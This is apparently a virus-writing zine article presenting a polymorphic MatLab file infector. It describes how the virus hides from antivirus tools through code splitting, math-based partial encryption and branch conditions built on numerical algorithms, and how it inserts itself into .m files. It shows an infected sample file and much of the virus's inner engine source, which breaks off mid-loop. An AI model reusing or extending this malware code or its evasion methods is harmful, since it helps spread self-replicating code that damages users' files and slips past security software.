  in February 2011 (version 1)
     July 2011 (version 2)





  1) Overview

  2) Techniques
  2.0) Preparation
  2.1) Splitting Algorithm
  2.2) Partial Encryption
  2.3) Multi-branch creation
  2.4) File insertation

  3) Inserted Code example

  4) Inner Code

  5) Running-Virus Dropper







  1) Overview

     This is a polymorphic MatLab file infector. It takes advantage of
     inbuild MatLab functions such as integration or solving of differential
     equations. It infects victims by searching appropriate places within their
     file code, and inserts the splitted virus to those possible places.

     Version 2 comes with partial encryption to increase randomness and
     detection complexity.


     The main idea was to combine two interesting concepts:

     -> tau-Obfuscation (or DELAYED CODE, as called by Z0MBiE):
        You can delay the execution of a specific code for arbitrary long
        time. Example:

        encrypted_code=[ENCRYPTED CODE];
        key=sum(factors(VERY_BIG_INTEGER_NUMBER));
        eval(decrypt(encrypted_code, key));

        If the VERY_BIG_INTEGER_NUMBER is set correct, the key generation can
        take very long time, much longer than possible for AV emulators.


     -> Multi-branches:
        ""Thus, if a program cannot determine the condition value, then it has
        to consider the two branches as possibly executable paths."" (in ""From
        the design of a generic metamorphic engine to a black-box 
        classification of antivirus detection techniques"" by Eric Filiol)

        The virus splitts itself into many parts and combines itself with
        conditional expressions. The condition values are complex (sometimes
        both meanings, yes :) ) mathematical algorithms from the MatLab
        framework.




     Why MatLab?
        It's the only language (maybe Mathematica-Script/Maple too, not sure)
        that has inbuild complicated numerical algorithm such as ODE solver,
        2D integration, function interpolation, ... AND file-access (for the
        virus purpose).

        You could do the same with C++ too I guess, but your code would
        become 10.000s of line I think, or you have to rely on some classes
        written by somebody else. I didnt like that idea...


     Are there other MatLab viruses?
        Yes, Positron has released two MatLab viruses in rRlf#7.
        (It saved me some hours of researching for file access in MatLab -
        thanks alot Positron!)
        One of the viruses was a polymorphic prepender, using bitwise XOR
        encryption and adding of trashlines.
        Vesselin Bontchev has written a description of the simple prepender
        version in VB June 06. (Its a naively written text with many stupid
        assumptions and an awkward reference to his mother (!)...)


     Is MatLab cool?
        It is an increadible powerful language (the vectorized style is great)
        but it has some disadvantages: temporary indexing is not available
        (you have to save the results in a temp-variable, then access it),
        not possible to write inbuild functions (just mathematical functions
        via inline), restriction of factors() to 2^32 (thats why i did not
        use it). As far as I know, the open source project Octave - which
        aims to run Matlab code natively - solves all these problems.


     Why is there an output by the virus?
        The nonlinear splitting/combining algorithm is slow (in fact, it is a
        t=O(x^3)-algorithm, x=number of virus parts), I prefered to know how
        long the engine needs. You can simply remove that one line. :)


     What is MicrophoneFever?
        The best thing you can do within 153 seconds...







  2) Techniques

  2.0) Preparation

       The virus starts in the following schema:

       -> Gets its code as a string.

               MyCode='WHOLE VIRUS CODE';
               eval(MyCode);

          The virus is executed as MyCode AND can work with MyCode string.
          This is a great feature of several script languages as MatLab,
          Phyton, JavaScript, ...


       -> A list of all variable names (VarList2Change) is created. In the 
          new code, all of those variables will be replaced by a new random
          string.

               ViralBodyVariable=Rnames{sum(AlgoMatrix)==SplitSize};

          may transform to

               kuwnhdklaoqje=ppqowmyy{sum(kjejiopoqqqwe)==kqjhwe};




  2.1) Splitting Algorithm

       -> The virus code is splitted to 3 to ~5.000 part (depending on the
          code size)

       -> A nonlinear algorithm combines the splitted parts. It does not
          create trash-lines, all created lines are actually functional.

          For example: MyCode='Hello VXers!!';

               var5=' ';
               var8='r';
               var5=[var5 'VX'];
               var5=['o' var5];
               var2='e';
               var7='e';
               var9='s!';
               var1='H';
               var9=[var8 var9];
               var3='ll';
               var3=[var3 var5];
               var7=[var7 var9];
               var2=[var1 var2];
               var3=[var3 var7];
               var2=[var2 var3];  % var2 contains the right string now

          or

               var1='H';
               var3='l';
               var5=' V';
               var6='Xer';
               var6=[var6 's!'];
               var4='lo';
               var3=['e' var3];
               var1=[var1 var3];
               var4=[var4 var5];
               var6=[var4 var6];
               var1=[var1 var6];  % var1 contains the right string now


       -> It also creates a list of trash lines, which will be used in the
          multi-branch creation. These lines contains the same variable names
          and often real splitted parts, but not correctly set together.
          This has been used to reduce the possibility of some statistical
          attack.



  2.2) Partial Encryption

       The whole code is splitted, still the splitted parts appear as plain
       text in the file. If one would add just enough subparts of the virus
       to the detection engine, a ""hopelessly unreliable detection"" could be
       created.

       To close this weakness, a partial encryption can be introduced.

       Partial: In 1/3, no string is encrypted; in 1/3 all strings are
       encrypted; in 1/3 of the cases, a random percentage from 0-100% of the
       strings are encrypted. Using partial encryption (not a single cryption
       threshold) should decrease the attack surface for statistical
       approaches.

       Encryption is done by a randomly created function which gives the right
       characters of the string.

       The string 'VXers!' can be transformed to

             [170.4808 775.5206 102.273 801.0846 749.7896 720.4606]-cosh(sinh(cos(sinh(asin(cosh(acos([33.2293 52.8826 73.2811 80.7829 59.5569 81.8432]).*4.4756).^4)).^4).^4).*6.1486)

       or

             log(1.2297+cosh(log(5.785+[97.2461 10.0701 71.5333 10.6979 74.2961 17.048]).^2.*7.3266))+[-70.0619 33.3868 -36.1665 57.8033 -24.4124 -37.3566]


       It would have been possible to use other algorithms too, for instance
       coding the characters in the eigenvalues of a rotated matrix; but the
       decrypter would be long and a possible source for detection.




  2.3) Multi-branch creation

       -> Each created split-line from above will be translated to a 
          conditional expression in the form of 

               if(condition)
                   CODE / TRASH
               else
                   TRASH / CODE
               end


       -> The conditions are in form of MatLab functions or algorithm.
          It can contain:

          * Matrix algorithm
                 + Creation of matrix (special Matrixes as Toeplitz, Vander,
                   Wilkinson, Hilbert, Pascal,... - or own Matrix)

                 + Downgrade to a vector (Matrix->Vector operations like sum
                   min, max), and compare with another vector; or downgrade
                   to a scalar (Matrix->Vector->Scalar) and compare with a
                   scalar.

               Example:

                   vec1=[4.6417 8.8343 1.4479 12.2282 0.50997];
                   if(sum(sum(toeplitz(vec1)))>(real(-16.7324)))

               or
                   vec1=[8.2601;9.091;4.72];
                   vec2=[2.7257 3.7423 12.201];
                   if(sum(sinh(max(sin(vec1*vec2))))<(max(vec2)))



          * Numerical Integration (1 or 2 dimensional)
                 + Creates a function in the form of:

                        S -> (SOS) | F(S) | x (| y)
                        O -> .* | +
                        F -> sin | cos | exp | atan | ...

                 + Defines the boundaries of the one or two dimensional
                   integral

                 + Searchs a numerical tolerance of the integral, such that
                   the calculation time is bigger than 0.1sec

               Example:

                   if(24.3639>quad(@(x)sin((sin(x)+cos(atan(exp((x.*x))))))+exp(x),0.544,pi,1e-17))

               or:

                   if(dblquad(@(x,y)atan((x.*exp(y))).*x,0.28659,pi,-log(2),0.95407,1e-9)<9.8827)



          * Function interpolation
                 + Creates a set of data points

                 + Interpolates the set with a function (whether cubic spline
                   interpolation or the MatLab standard interpolation -
                   couldnt figure out which algorithm is used there)

               Example:

                   DataSet=[232.1477 280.9793 256.6344 ... 277.559 94.0081];
                   if(interp1(DataSet,39.2492,'spline')<218.56696)

               or
                   DataSet=[374.2217 99.3665 209.64 ... 231.027 151.0387 619.6979];
                   if(476.349<interp1(DataSet,8.3597))



          * Ordinary differential equation (ODEs)
                 + Creates a function in the same form as for Numerical
                   Integration

                 + Defines a interval to solve the ODE

                 + Avoids singularities in the solution (by an external
                   function at creation time) and odd numerical behaviour
                   (by interpolation)

                 + The ODE is in the form of: y'(x)=f(x,y)

               Example:

                   num=2.4495113;
                   f=inline('x+cos((cos((y.*sin(atan(x))))+x))','x','y');
                   if(interp1(ode45(f,[1 2],0.74001),2.3164)>num)

               or

                   f=inline('atan(cos(cos(x))).*x','x','y');
                   [y_sol,x_sol]=ode45(f,[2 6],0.043357);
                   num=-18.4964633;
                   if(num<interp1(y_sol,x_sol,3.6929))



          * Special functions
                 + Creates a combination of inbuild MatLab functions
                   (such as trigonometric, hyperbolic, exponential functions,
                   Airy, ...) in the form of

                        S -> F(S) | D(S,S) | R
                        F -> single_argument_functions
                        D -> double_argument_functions
                        R -> random number (could be in form of a variable)

               Example:

                   if(-0.30629>sec(csc(cosh(acsch(atan(expm1(expm1(dot(0.0070583,sqrt(cosh(csc(-3.0156))))))))))))

               or

                   if(cosh(airy(hypot(sqrt(airy(pol2cart(0.98087,asech(log10(expint(-2.8337)))))),-1.4817)))>1.83597932)


       -> The number which is compared to the function/algorithm is very
          close the the actual value. Thus, no simple approximation can
          figure out if the branch is true or false.




  2.4) File insertation

       -> Searchs .m files in the current directory

       -> Adjusts the file content for better further analysis

               This code:

                   disp('1')
                   % blah blah end FF 
                   disp('2')
                   a=['a' 'b' 'asd'...
                       'c' 'd'];
                   disp('3')

               will be transformed into this one:

                   disp('1')
                   disp('2')
                   a=['a' 'b' 'asd' 'c' 'd'];
                   disp('3')


       -> Searchs appropriate places in the file to put part of its code.
          It takes care of comments, strings; if/for/while/... end blocks,
          it will not put code into such blocks.

               Before the lines marked with **, a virus block could be:

                   disp('1 end ')
                   **TheImportantValue='';
                   **if (1>2)    
                   	end
                   **disp('2')
                   **disp('3')
                   **disp('4')
                   **a=['a' 'b' 'asd' 'c' 'd'];
                   **if (1)
                       while(3<2)
                           disp('!');
                       end
                       for i=0:100
                           fprintf(num2str(i));
                       end
                       disp('!!!')
                   end    
                   **disp('5')
                   **disp('6')





  3) Inserted Code example

       We have the following victim file:

- - - - - - - - - - - - - 
disp('1 end ')
TheImportantValue='';
if (1>2)    
	end
disp('2')
% blah blah end FF 
disp('3')
disp('4')

a=['a' 'b' 'asd'...
    'c' 'd'];

if (1)
    while(3<2)
        disp('!');
    end
    for i=0:100
        fprintf(num2str(i));
    end
    disp('!!!')
end
        
disp('5')
disp('6')
- - - - - - - - - - - - - 

       and we have: MyCode='disp(''Hello VXers!'');';
       Lets insert it (the split value is set to a small value for this test,
       otherwise the output code would be too big for this text):

- - - - - - - - - - - - - 
disp('1 end ')
seojrham=[80.1955 222.5374 320.3328 11.9943 119.2478 323.1966 312.5236];
ypjhcxlrfpxwddgqm=inline('exp(exp(cos(exp(djvq))))+jd','jd','djvq');
rekenak=29.483297;
TheImportantValue='';
bnwgkk=[4.5711 40.9198 15.4202 1.913 39.5907 4.3657 0.58167 23.559 18.2378 27.6471 30.4092 25.3275 34.6182 32.3448];
warning off all
[rfatmpmfs,vfmlbot]=ode45(ypjhcxlrfpxwddgqm,[1 2],0.69443);
if (1>2)    
	end
if(interp1(seojrham,3.9392)>rekenak)
    oiluac=[char(cosh(atan([15.1939 6.12223]-9.4617)).^6+[17.6758 -19.1397])];
else
    oiluac=['lo VXer' oiluac];end
lsiihcg=inline('sin(hygs)+hygs','hygs','da');
disp('2')
disp('3')
loferyjwhyidokaoufm=27.9677;
disp('4')
if(interp1(rfatmpmfs,vfmlbot,1.7544)<loferyjwhyidokaoufm)
    rsvcdgpureo='Hel';
else     rsvcdgpureo=['p(''' rsvcdgpureo];
end
xmokesvtqjg=8.11108542;
[pqhkgmgfciqkytbuyf,gjtsfkvgqinfduxok]=ode45(lsiihcg,[-2 2],1.9496);
if(atanh(sin(acsc(asinh(sec(coth(ceil(hypot(acsc(pow2(3.8305)),pow2(1.23)))))))))<1.0135)
      oiluac=[oiluac ''');'];
else
   oeuqyfjrpiyyyhtk=char(exp(sinh(sin([25.8973 22.922 64.305]).^6).^6+5.5158)+[-176.02879 -147.12364 -1931.728]);end
xtwdis=5.25585;

if(xtwdis>interp1(pqhkgmgfciqkytbuyf,gjtsfkvgqinfduxok,-1.5165))
    rsvcdgpureo=[rsvcdgpureo 'lo VXer'];
else
  xcbkd='dis';end
fqwusqi=[13.9467 18.0377 13.1914 10.3708; 9.0949 17.3267 10.5518 7.2748; 10.84 4.6586 17.9209 11.4189; 3.6229 4.4043 14.3686 7.4208];
if(xmokesvtqjg>interp1(bnwgkk,4.1808,'spline'))
wdwpcgnxydyxmudkw='nwkhrrb';
else
oiluac=[rsvcdgpureo oiluac];end
if(3.7386559<quad(@(lim)lim.*sin(lim),-0.56309,pi,1e-17))
      xcbkd='p(''';
else
      oiluac=['p(''' oiluac];end
lypkmnkjduiigl=2.5614065;
a=['a' 'b' 'asd'    'c' 'd'];

if(lypkmnkjduiigl>dblquad(@(egour,yo)egour.*(exp(yo).*exp(yo)),0.098172,sqrt(2),0.49925,0.95541,1e-14))
    wdwpcgnxydyxmudkw='dis';else
    wdwpcgnxydyxmudkw=[char([97.46725 105.6968 115.4771]-tan([8.17217 41.0319 31.3898])) wdwpcgnxydyxmudkw];
end
dpivwyhixqii=[7.9045 3.0981 6.5743 0.015212];
if (1)
    while(3<2)
        disp('!');
    end
    for i=0:100
        fprintf(num2str(i));
    end
    disp('!!!')
end
        
if((real(cos(sum(dpivwyhixqii))))>exp(min(sqrt(max(exp(tan(fqwusqi)))))))
    wdwpcgnxydyxmudkw=['Hel' wdwpcgnxydyxmudkw];
else
    wdwpcgnxydyxmudkw=[wdwpcgnxydyxmudkw oiluac];end
eval(wdwpcgnxydyxmudkw);
disp('5')
disp('6')

- - - - - - - - - - - - - 








  4) Inner Code

     The virus is optimized, thus hardly readable. So here the inner, non-
     optimized version of it. It still contains some debug-output, but all in
     all its the same as the original virus.

- - - - - - - - - - - - - 
warning off all

QuoteSign=char(39);
MyCode='disp(''Hello VXers!'');';
ChangeNumber=1*length(MyCode); % Can be included to the code directly
MyCode=[MyCode,' '];
VarList2Change={'EncOReplacePool1' 'EncryptThreshold' 'EncQReplacePool1' 'ThisVarContainsVirus' 'EncDiff' 'EvaledCryptArray' 'OrigString2Enc' 'EncFReplacePool1' 'MyCode' 'TmpRndName' 'EncSReplacePool1' 'CPcrypt' 'VarList2Change' 'GiveEncString' 'EncStartFunction' 'ChangeNumber' 'FfAll' 'DfAll' 'SplitOffset' 'MatXNameXX' 'EncryString' 'CodePart' 'Rnames' 'NewCode' 'TrashNames' 'TrashLine' 'SplitSize' 'QuoteSign' 'CreateTrashA' 'CreateTrashB' 'CreateTrashC' 'CreateTrashD' 'CreateTrash1' 'CreateTrash2' 'ODEfile' 'odefunction' 'RandPermSS' 'AlgoMatrix' 'ViralBodyVariable' 'ActualCodeForThisPart' 'Var2Wrt' 'ObfusCount' 'RandomAppearenceOfIfs' 'LineBreaksIf' 'LineShift' 'runcode' 'RandNameCol' 'CODE' 'TRASH' 'WhichMathAlgo' 'FReplacePool1' 'StartFunction' 'SReplacePool1' 'OReplacePool1' 'MatSizeN' 'SomeMatVec' 'MultFct' 'SpecMatName' 'SpecVecName' 'WhichMatrixAlgo' 'MatArOp' 'VecArOp' 'SavedVector' 'IsItAVector' 'Operator1' 'Operator2' 'BoundAll1' 'BoundAll2' 'BoundAll3' 'BoundTmpA' 'BoundTmpB' 'BoundSign' 'FctString1' 'FctString2' 'FctString3' 'IntTolerance' 'TimeMeasure' 'CompleteCompString' 'CompleteErg' 'InterpDataVec' 'InterpSpline' 'ODEIntervallA' 'ODEIntervallB' 'ODEDomain' 'ODEIntX' 'SReplacePool2' 'RCWriteVar' 'RCNumSub' 'RCNumAdd' 'MulFacRC' 'IncFa' 'RC' 'RCsSub' 'RCsAdd' 'VirCode' 'IsAllEmpty' 'VicFiles' 'VicLines' 'NewInfCode' 'VicIDr' 'IsAPO' 'EndArray' 'EndCount' 'GoodLine' 'IsAPP' 'IsStart' 'IsEnd' 'VCsplitted' 'VirSplit' 'VicIDw' 'Count000' 'Count001' 'Count002' 'Count003' 'Count004' 'Count005' 'Count006' 'Count007' 'Count008' 'Count009' 'Count010' 'Count011' 'Count012' 'Count013' 'Count014' 'Count015' 'Count016' 'Count017' 'Count018' 'Count019' 'Count020' 'Count021' 'Count022' 'Count023' 'Count024' 'Count025' 'Count026' 'Count027' 'Count028' 'Count029' 'Count030' 'Count031' 'Count032' 'Count033' 'TmpVar001' 'TmpVar002' 'TmpVar003' 'TmpVar004' 'TmpVar005' 'TmpVar006' 'TmpVar007' 'TmpVar008'};
FfAll={'sin' 'sinh' 'asin' 'asinh' 'cos' 'cosh' 'acos' 'acosh' 'tan' 'tanh' 'atan' 'atanh' 'sec' 'sech' 'asec' 'asech' 'csc' 'csch' 'acsc' 'acsch' 'cot'  'coth' 'acot' 'acoth' 'exp' 'expm1' 'log' 'log1p' 'log10' 'log2' 'pow2' 'sqrt' 'nextpow2' 'abs' 'angle' 'conj' 'imag' 'real' 'unwrap' 'fix' 'floor' 'ceil' 'round' 'sign' 'airy' 'expint'};
DfAll={'hypot' 'dot' 'cart2pol' 'pol2cart' 'atan2'};
TmpRndName={};
for Count032=1:length(VarList2Change) % Random Names for VariableNameChaning
    TmpRndName{end+1}='if';while (any(strcmp({FfAll{:} DfAll{:} TmpRndName{1:end-1}},TmpRndName{end}))||iskeyword(TmpRndName{end})) TmpRndName{end}=char(fix(rand(1,fix(rand*15)+5)*25)+97);end
end


SeedCounter=fix(rand*10000+sum(cputime));
rand('twister', SeedCounter);        


for Count031=1:length(VarList2Change) % VariableNameChaning
    MyCode=strrep(MyCode,VarList2Change{Count031},TmpRndName{Count031});
end

SplitOffset=unique([1,sort(fix(rand(1,fix(rand*ChangeNumber)+3)*size(MyCode,2)+1)),size(MyCode,2)]);
CodePart={}; Rnames={}; NewCode={}; TrashNames={}; TrashLine={};
SplitSize=size(SplitOffset,2)-1;    % Number of code parts


for Count033=1:SplitSize
    CodePart{end+1}=MyCode(SplitOffset(Count033):SplitOffset(Count033+1)-1);          % CodePart
    Rnames{end+1}='sin'; while any(strcmp({FfAll{:} DfAll{:} Rnames{1:end-1}},Rnames{end})) Rnames{end}=char(fix(rand(1,fix(rand*15)+4)*25)+97);end           % Random Names
end

CreateTrashA=['if(rand<EncryptThreshold)OrigString2Enc=CodePart{fix(rand*SplitSize+1)};eval(GiveEncString);TrashString=[''char('' EncryString '')''];OrigString2Enc=char(fix(rand(1,fix(rand*7)+3)*25)+97);eval(GiveEncString);GarbageString=[''char('' EncryString '')''];else GarbageString=['''''''' char(fix(rand(1,fix(rand*7)+3)*25)+97) ''''''''];TrashString=['''''''' strrep(CodePart{fix(rand*SplitSize+1)},'''''''','''''''''''') ''''''''];display(TrashString);end;if(max(sum(AlgoMatrix))>0.05*SplitSize)TrashNames=Rnames(diag(AlgoMatrix));end;tmp=rand;tn=fix(rand*(length(TrashNames)-1)+1);tmpord=randperm(length(TrashNames));'];
CreateTrashB=['if (tmp>0.9) TrashLine{end+1}=[Rnames{fix(rand*SplitSize+1)} ',QuoteSign,'=',QuoteSign,',TrashString,',QuoteSign,';',QuoteSign,'];else'];
CreateTrashC=['if (tmp>0.7 && length(TrashNames)) TrashLine{end+1}=[TrashNames{tn},',QuoteSign,'=[',QuoteSign,',TrashNames{tn},',QuoteSign,' ',QuoteSign,',TrashString,',QuoteSign,'];',QuoteSign,'];'];
CreateTrashC=[CreateTrashC 'elseif (tmp>0.5 && length(TrashNames)>2) TrashLine{end+1}=[TrashNames{tmpord(1)},',QuoteSign,'=[',QuoteSign,',TrashNames{tmpord(2)},',QuoteSign,' ',QuoteSign,',TrashNames{tmpord(1)},',QuoteSign,'];',QuoteSign,'];'];
CreateTrashC=[CreateTrashC 'elseif (tmp>0.3 && length(TrashNames)>2) TrashLine{end+1}=[TrashNames{tmpord(1)},',QuoteSign,'=[',QuoteSign,',TrashNames{tmpord(1)},',QuoteSign,' ',QuoteSign,',TrashNames{tmpord(2)},',QuoteSign,'];',QuoteSign,'];'];
CreateTrashC=[CreateTrashC 'elseif (tmp>0.1 && length(TrashNames)) TrashLine{end+1}=[TrashNames{tn},',QuoteSign,'=[',QuoteSign,',TrashString,',QuoteSign,' ',QuoteSign,',TrashNames{tn},',QuoteSign,'];',QuoteSign,'];'];
CreateTrashD=['else TrashLine{end+1}=[Rnames{tn},',QuoteSign,'=',QuoteSign,',GarbageString,',QuoteSign,';',QuoteSign,'];end'];
CreateTrash1=[CreateTrashA CreateTrashB CreateTrashC CreateTrashD];
CreateTrash2=[CreateTrashA CreateTrashC 'else TrashLine{end+1}=[TrashNames{tn},',QuoteSign,'=[',QuoteSign,',TrashString,',QuoteSign,' ',QuoteSign,',TrashNames{tn},',QuoteSign,'];',QuoteSign,'];end'];
GiveEncString=['EncDiff=0;EvaledCryptArray=0;OrigString2Enc=OrigString2Enc+rand();while(EncDiff<length(OrigString2Enc)||isnan(EncDiff)||isinf(EncDiff)||sum(isnan(EvaledCryptArray))||sum(isinf(EvaledCryptArray))||sum(abs(EvaledCryptArray)>10000)||sum(abs(imag(EvaledCryptArray))))EncFReplacePool1={',QuoteSign,'sin',QuoteSign,' ',QuoteSign,'cos',QuoteSign,' ',QuoteSign,'exp',QuoteSign,' ',QuoteSign,'atan',QuoteSign,' ',QuoteSign,'sinh',QuoteSign,' ',QuoteSign,'cosh',QuoteSign,' ',QuoteSign,'log',QuoteSign,' ',QuoteSign,'asin',QuoteSign,' ',QuoteSign,'acos',QuoteSign,' ',QuoteSign,'tan',QuoteSign,'};EncSReplacePool1={ ',QuoteSign,'F(NOS)Q',QuoteSign,' ',QuoteSign,'F(SON)Q',QuoteSign,' ',QuoteSign,'F(S)Q',QuoteSign,' ',QuoteSign,'F(S)Q',QuoteSign,' ',QuoteSign,'F(SON)Q',QuoteSign,' ',QuoteSign,'F(NOS)Q',QuoteSign,'};EncStartFunction=EncSReplacePool1{fix(rand*length(EncSReplacePool1)+1)};EncSReplacePool1{1}=',QuoteSign,'if',QuoteSign,'; EncSReplacePool1{2}=',QuoteSign,'if',QuoteSign,';EncOReplacePool1={',QuoteSign,'.*',QuoteSign,' ',QuoteSign,'+',QuoteSign,' ',QuoteSign,'-',QuoteSign,'};EncQReplacePool1={',QuoteSign,'',QuoteSign,' [',QuoteSign,'.^',QuoteSign,' num2str(fix(rand()*5+2))] ',QuoteSign,'',QuoteSign,' ',QuoteSign,'',QuoteSign,' ',QuoteSign,'',QuoteSign,'};while (length(strfind(EncStartFunction,',QuoteSign,'S',QuoteSign,'))+length(strfind(EncStartFunction,',QuoteSign,'O',QuoteSign,'))+length(strfind(EncStartFunction,',QuoteSign,'F',QuoteSign,'))>0) EncStartFunction=regexprep(EncStartFunction,',QuoteSign,'S',QuoteSign,',EncSReplacePool1{fix(rand*length(EncSReplacePool1)+1)},rand*length(strfind(EncStartFunction,',QuoteSign,'S',QuoteSign,'))+1);EncStartFunction=regexprep(EncStartFunction,',QuoteSign,'F',QuoteSign,',EncFReplacePool1{fix(rand*length(EncFReplacePool1)+1)},rand*length(strfind(EncStartFunction,',QuoteSign,'F',QuoteSign,'))+1);EncStartFunction=regexprep(EncStartFunction,',QuoteSign,'O',QuoteSign,',EncOReplacePool1{fix(rand*length(EncOReplacePool1)+1)},rand*length(strfind(EncStartFunction,',QuoteSign,'O',QuoteSign,'))+1);EncStartFunction=regexprep(EncStartFunction,',QuoteSign,'N',QuoteSign,',num2str(rand*10),rand*length(strfind(EncStartFunction,',QuoteSign,'N',QuoteSign,'))+1);EncStartFunction=regexprep(EncStartFunction,',QuoteSign,'Q',QuoteSign,',EncQReplacePool1{fix(rand*length(EncQReplacePool1)+1)},rand*length(strfind(EncStartFunction,',QuoteSign,'Q',QuoteSign,'))+1);if(max(cumsum(EncStartFunction==',QuoteSign,'(',QuoteSign,')-cumsum(EncStartFunction==',QuoteSign,')',QuoteSign,'))>25) EncSReplacePool1{3}=EncSReplacePool1{1};EncSReplacePool1{4}=EncSReplacePool1{1};EncSReplacePool1{5}=EncSReplacePool1{2};EncSReplacePool1{6}=EncSReplacePool1{2};end;end;EncStartFunction=regexprep(EncStartFunction,',QuoteSign,'if',QuoteSign,',[',QuoteSign,'[',QuoteSign,' num2str(100*rand(1,length(OrigString2Enc))) ',QuoteSign,']',QuoteSign,' ]);EvaledCryptArray=eval(EncStartFunction);EncDiff=sum(abs(diff(fix(EvaledCryptArray))))+(length(OrigString2Enc)==1);end;if rand>0.67 CPcrypt=OrigString2Enc+EvaledCryptArray;EncryString=[',QuoteSign,'[',QuoteSign,' num2str(CPcrypt) ',QuoteSign,']-',QuoteSign,' EncStartFunction];else CPcrypt=OrigString2Enc-EvaledCryptArray;if rand>0.66 EncryString=[',QuoteSign,'[',QuoteSign,' num2str(CPcrypt) ',QuoteSign,']+',QuoteSign,' EncStartFunction];else EncryString=[EncStartFunction ',QuoteSign,'+[',QuoteSign,' num2str(CPcrypt) ',QuoteSign,']',QuoteSign,'];end;end;while(strfind(EncryString,',QuoteSign,'  ',QuoteSign,'))EncryString=strrep(EncryString,',QuoteSign,'  ',QuoteSign,',',QuoteSign,' ',QuoteSign,');end'];
ODEfile=fopen('odefunction.m','w+');
fprintf(ODEfile,['function status=odefunction(t,y,flagzz,args);status=0;if ~isempty(t) if ~any(abs(t-t(1))>1.e-4) disp(',QuoteSign,'toooo small',QuoteSign,');status=1;end;end']);
fclose(ODEfile);
rehash;

%M  = false(SplitSize);
%M( ... ) = true;
%~any(all(M))


EncryptThreshold=rand();if(EncryptThreshold<0.33)EncryptThreshold=0;elseif(EncryptThreshold>0.66)EncryptThreshold=1;elseEncryptThreshold=rand();end;EncryptThreshold=0.5;

RandPermSS=randperm(SplitSize);  % Random order of the Code elements
AlgoMatrix=false(SplitSize,SplitSize);  % Algorithm matrix



for Count000=1:SplitSize disp([num2str(Count000) '/' num2str(SplitSize)]);if(RandPermSS(Count000)>1)for Count001=1:SplitSize if(rand>0.4 && AlgoMatrix(RandPermSS(Count000)-1,Count001))if(rand()<EncryptThreshold)OrigString2Enc=CodePart{RandPermSS(Count000)};eval(GiveEncString);NewCode{end+1}=[Rnames{Count001},'=[',Rnames{Count001},' char(',EncryString,')];'];else NewCode{end+1}=[Rnames{Count001},'=[',Rnames{Count001},' ',QuoteSign,strrep(CodePart{RandPermSS(Count000)},'''',''''''),QuoteSign,'];'];end;AlgoMatrix(RandPermSS(Count000),Count001)=1;eval(CreateTrash1);end;end;end;if(sum(AlgoMatrix(RandPermSS(Count000),:),2)==0 && RandPermSS(Count000)<SplitSize-1)for Count002=1:SplitSize if (rand>0.4 && AlgoMatrix(RandPermSS(Count000)+1,Count002)==1)if(rand()<EncryptThreshold)OrigString2Enc=CodePart{RandPermSS(Count000)};eval(GiveEncString);NewCode{end+1}=[Rnames{Count002},'=[char(',EncryString,') ',Rnames{Count002},'];'];else NewCode{end+1}=[Rnames{Count002},'=[',QuoteSign,strrep(CodePart{RandPermSS(Count000)},'''',''''''),QuoteSign,' ',Rnames{Count002},'];'];end;AlgoMatrix(RandPermSS(Count000),Count002)=1;eval(CreateTrash1);end;end;end;if (sum(AlgoMatrix(RandPermSS(Count000),:),2)==0)if(rand()<EncryptThreshold)OrigString2Enc=CodePart{RandPermSS(Count000)};eval(GiveEncString);NewCode{end+1}=[Rnames{RandPermSS(Count000)},'=[char(',EncryString,')];'];else NewCode{end+1}=[Rnames{RandPermSS(Count000)},'=',QuoteSign,strrep(CodePart{RandPermSS(Count000)},'''',''''''),QuoteSign,';'];end;AlgoMatrix(RandPermSS(Count000),RandPermSS(Count000))=1;
        
        
        
        
        TrashNames{end+1}=Rnames{RandPermSS(Count000)};
        eval(CreateTrash1);
    end
    for Count003=2:SplitSize                                                            % Count003 ... zeile
        for Count004=1:SplitSize                                                        % Count004 ... spalte
            Count005=find(AlgoMatrix(Count003,:));
            if (~AlgoMatrix(Count003,Count004) && AlgoMatrix(Count003-1,Count004) && size(Count005,2)>0 && rand>0.4)
                if (rand>0.5)
                    NewCode{end+1}=[Rnames{Count004},'=[',Rnames{Count004},' ',Rnames{Count005},'];'];
                    AlgoMatrix(:,Count004)=AlgoMatrix(:,Count004)+AlgoMatrix(:,Count005);
                    AlgoMatrix(:,Count005)=0;
                    eval(CreateTrash1);
                else
                    NewCode{end+1}=[Rnames{Count005},'=[',Rnames{Count004},' ',Rnames{Count005},'];'];
                    AlgoMatrix(:,Count005)=AlgoMatrix(:,Count005)+AlgoMatrix(:,Count004);
                    AlgoMatrix(:,Count004)=0;
                    eval(CreateTrash1);
                end
            end
        end
    end
end

while ~any(all(AlgoMatrix))
    for Count006=2:SplitSize                                                            % Count006 ... zeile
        for Count007=1:SplitSize                                                        % Count007 ... spalte
            Count008=find(AlgoMatrix(Count006,:)); 
            if (~AlgoMatrix(Count006,Count007) && AlgoMatrix(Count006-1,Count007) && size(Count008,2)>0 && rand>0.4)
                if (rand>0.5)
                    NewCode{end+1}=[Rnames{Count007},'=[',Rnames{Count007},' ',Rnames{Count008},'];'];
                    AlgoMatrix(:,Count007)=AlgoMatrix(:,Count007)+AlgoMatrix(:,Count008);
                    AlgoMatrix(:,Count008)=0;
                    TrashNames=Rnames(diag(AlgoMatrix));
                    eval(CreateTrash2);
                else
                    NewCode{end+1}=[Rnames{Count008},'=[',Rnames{Count007},' ',Rnames{Count008},'];'];
                    AlgoMatrix(:,Count008)=AlgoMatrix(:,Count008)+AlgoMatrix(:,Count007);
                    AlgoMatrix(:,Count007)=0;
                    TrashNames=Rnames(diag(AlgoMatrix));
                    eval(CreateTrash2);
                end
            end
        end
    end
end

for Count009=1:size(NewCode,2)
    disp(NewCode{Count009});
    eval(NewCode{Count009});
end
ViralBodyVariable=Rnames{sum(AlgoMatrix)==SplitSize};
NewCode=strrep(NewCode,ViralBodyVariable,TmpRndName{1});
TrashLine=strrep(TrashLine,ViralBodyVariable,TmpRndName{1});
%disp(ViralBodyVariable);
disp('After Splitting:')
eval(Rnames{sum(AlgoMatrix)==SplitSize});


ActualCodeForThisPart={}; Var2Wrt={}; ObfusCount=1;
RandomAppearenceOfIfs=fix(rand*2);LineBreaksIf=fix(rand(1,4)*2);LineShift={};LineShift{1}(1:fix(rand*8))=' ';
if rand>0.7 LineShift{1}='    ';end;if rand>0.3 LineShift{2}=LineShift{1};else LineShift{2}(1:fix(rand*8))=' ';end

while(ObfusCount<=length(NewCode))
    Var2Wrt{ObfusCount}={};
    ActualCodeForThisPart{ObfusCount}={};
    runcode=0; RandNameCol={};
    for Count010=0:10
